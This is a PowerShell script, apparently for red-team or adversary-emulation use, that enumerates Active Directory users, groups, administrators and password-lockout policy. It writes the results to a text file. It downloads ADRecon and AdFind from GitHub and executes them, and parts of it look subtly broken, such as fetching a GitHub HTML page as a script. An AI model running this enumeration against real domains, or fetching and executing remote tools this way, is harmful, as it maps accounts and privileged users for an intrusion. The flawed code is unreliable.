"user enum on domain" > .\userenum.txt
try
{
net user /domain | Add-Content -Path .\userenum.txt
net group /domain | Add-Content -Path .\userenum.txt
}
catch
{
   Write-Output "failed to execute netuser"
}
try
{
get-localgroupmember -group Users | Add-Content -Path .\userenum.txt
get-aduser -filter * | Add-Content -Path .\userenum.txt
}
catch
{
Write-Output "failed to execute get-localgroup or get-aduser"
}
try
{
$cname=$env:computername
query user /SERVER:$cname | Add-Content -Path .\userenum.txt
}
catch
{
Write-Output "failed to execute query"
}
try
{
Invoke-WebRequest https://github.com/sense-of-security/ADRecon/blob/master/ADRecon.ps1 -OutFile ADRecon.ps1
Invoke-Expression ADRecon.ps1 | Add-Content -Path .\userenum.txt
}
catch
{
Write-Output "failed to execute query"
}
try
{
Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1087.002/src/AdFind.exe?raw=true -OutFile AdFind.exe
./AdFind.exe -default -s base lockoutduration lockoutthreshold lockoutobservationwindow maxpwdage minpwdage minpwdlength pwdhistorylength pwdproperties| Add-Content -Path .\userenum.txt
}
catch
{
Write-Output "failed to download or execute AdFind"
}
try
{
./AdFind.exe -sc admincountdmp | Add-Content -Path .\userenum.txt
./AdFind.exe -f (objectcategory=person) | Add-Content -Path .\userenum.txt
./AdFind.exe -sc exchaddresses | Add-Content -Path .\userenum.txt
}
catch
{
Write-Output "failed to execute AdFind"
}
try
{
    net user administrator /domain | Add-Content -Path .\userenum.txt

}
catch
{
    Write-Output "failed to net user admin.."
}
